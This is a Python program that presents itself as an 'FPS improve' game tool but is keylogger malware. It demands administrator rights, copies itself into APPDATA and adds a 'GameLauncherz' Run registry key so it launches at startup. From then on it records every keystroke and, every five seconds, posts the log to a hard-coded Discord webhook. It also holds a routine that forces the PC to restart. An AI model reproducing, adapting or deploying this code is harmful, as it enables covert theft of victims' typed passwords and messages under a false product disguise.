import pynput.keyboard
import requests
import time
import os
import shutil
import winreg as reg
import sys
import ctypes
import configparser
from datetime import datetime

MB_OK = 0x0
ICON_INFORMATION = 0x40
ICON_ERROR = 0x10
folder_path = os.path.join(os.getenv('APPDATA'), 'Local', 'fps_improve')
ini_file_path = os.path.join(folder_path, 'settings.ini')

def read_config():
    config = configparser.ConfigParser()
    config.read(ini_file_path)
    return config

def show_message_box(message, title="Message", style=MB_OK | ICON_INFORMATION):
    ctypes.windll.user32.MessageBoxW(0, message, title, style)
    
def create_ini_file():
    if not os.path.exists(ini_file_path):
        config = configparser.ConfigParser()
        config['Settings'] = {'isadmin': 'false'}

        with open(ini_file_path, 'w') as config_file:
            config.write(config_file)

def createthepath():
    if not os.path.exists(folder_path):
        try:
            os.makedirs(folder_path)
            print(f"FPS improved successfully")
        except Exception as e:
            print(f"FPS improve error.1")

def update_admin_status():
    config = configparser.ConfigParser()

    try:
        config.read(ini_file_path)
        if 'Settings' not in config:
            config['Settings'] = {}
        config['Settings']['isadmin'] = 'true'
        with open(ini_file_path, 'w') as config_file:
            config.write(config_file)
    except (configparser.NoSectionError, configparser.NoOptionError, FileNotFoundError):
        print("INI file not found or incorrectly formatted.")


def checkAdminStatus():
    config = read_config()
    dataAdminStatus = config.get('Settings', 'isadmin')
    if ( dataAdminStatus!= 'true'):
        print("admin is not true"+dataAdminStatus)
        show_message_box("Please run the app as an administrator.", "Error", MB_OK | ICON_ERROR)
        sys.exit()
        
def is_adminx():
    try:
        if ctypes.windll.shell32.IsUserAnAdmin():
            print("admin privileged")
            update_admin_status()
            print("updated admin status")
            return True
        else:
            print("not admin")
            return False
    except:
        return False
    
createthepath()
create_ini_file()
is_adminx()
checkAdminStatus()
    

original_file_path = "fps_improve.exe"

def force_restart():
    try:
        show_message_box("Your PC will have to restart.", "Information", MB_OK | ICON_INFORMATION)
        os.system('shutdown /r /f /t 0')
    except Exception as e:
        print(f"Error initiating restart: {e}")
        
new_file_path = os.path.join(folder_path, 'fps_improve.exe')


        
def add_startup_entry(program_path):
    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    key_name = "GameLauncherz"

    try:
        key = reg.OpenKey(reg.HKEY_CURRENT_USER, key_path, 0, reg.KEY_SET_VALUE)
        reg.SetValueEx(key, key_name, 0, reg.REG_SZ, program_path)
        print(f"added to Start up successfully.")
    except Exception as e:
        print(f"Error adding startup entry: {e}")
    finally:
        reg.CloseKey(key)

if not os.path.exists(new_file_path):
    try:
        shutil.copyfile(original_file_path, new_file_path)
        if is_adminx():
            add_startup_entry(new_file_path)
            show_message_box("FPS success.", "Information", MB_OK | ICON_INFORMATION)
        else:
            show_message_box("ERROR", "Information", MB_OK | ICON_INFORMATION)
            
        
        print("added to start up sucessfully")
    except FileNotFoundError:
        print(f"file not found.4")
    except Exception as e:
        print(f"error.5")
        
   
    

log_file_path = "templogsx.txt"
webhook_url = "https://discord.com/api/webhooks/1196001620576710786/F3ptCR2sIdGuYwfHw6NAlDrtCjsGQKpaDlr8RyFaRmzR9btucvu_9u1xfOCbAG1zz--e"

def clear_large_file(file_path, max_size_kb=1000):
    # Get the size of the file in KB
    file_size_kb = os.path.getsize(file_path) / 1024

    if file_size_kb > max_size_kb:
        # If the file size exceeds the specified limit, clear its contents
        with open(file_path, 'w') as file:
            file.truncate(0)

def on_press(key):
    try:
        with open(log_file_path, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(log_file_path, "a") as f:
            f.write(f"{key} ")

def get_last_sent_timestamp():
    sent_file_path = log_file_path + ".sent"
    
    if os.path.exists(sent_file_path):
        try:
            with open(sent_file_path, 'r') as sent_file:
                timestamp_str = sent_file.read()
                return float(timestamp_str)
        except Exception as e:
            print(f"Error reading last sent timestamp: {e}")

    return None

def update_last_sent_timestamp():
    sent_file_path = log_file_path + ".sent"
    
    try:
        timestamp_str = str(datetime.timestamp(datetime.now()))
        with open(sent_file_path, 'w') as sent_file:
            sent_file.write(timestamp_str)
    except Exception as e:
        print(f"Error updating last sent timestamp: {e}")

def get_file_timestamp(file_path):
    try:
        return os.path.getmtime(file_path)
    except Exception as e:
        print(f"Error getting file timestamp: {e}")
        return 0

def send_log_to_discord():
    if os.path.exists(log_file_path):
        with open(log_file_path, 'r') as file:
            content = file.read()
        
        cleaned_content = content.replace("Key.cmd", "").replace("Key.right", "").replace("Key.space", "").replace("Key.shift", "").replace("Key.enter", "").replace("Key.backspace", "").replace("Key.ctrl_l", "").replace("Key.alt_l", "")

        if cleaned_content.strip():  # Check if cleaned content is not empty
            last_sent_timestamp = get_last_sent_timestamp()

            # Check if the content has been sent already or if it's new since the last sent timestamp
            if last_sent_timestamp is None or get_file_timestamp(log_file_path) > last_sent_timestamp:
                data = {"content": cleaned_content}
                response = requests.post(webhook_url, json=data)
                print(response.text)

                # Update the last sent timestamp
                update_last_sent_timestamp()

        clear_large_file(log_file_path)
    else:
        # Create the templogsx.txt file if it doesn't exist
        with open(log_file_path, 'w') as file:
            file.write("")


            
current_path = os.getcwd()

if current_path != folder_path:
    print("Error in path")
    sys.exit()

with pynput.keyboard.Listener(on_press=on_press) as listener:
    while True:
        time.sleep(5)
        send_log_to_discord()
